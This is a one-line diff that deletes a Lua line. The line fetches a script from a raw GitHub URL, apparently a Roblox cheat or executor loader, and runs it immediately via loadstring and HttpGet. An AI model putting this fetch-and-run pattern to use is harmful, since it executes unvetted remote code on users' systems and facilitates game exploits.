@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/moduletanagerdefend/loaders/main/loaders/tha-bronx-3-spam2-1pt35vi4ocqjbn.lua"))()
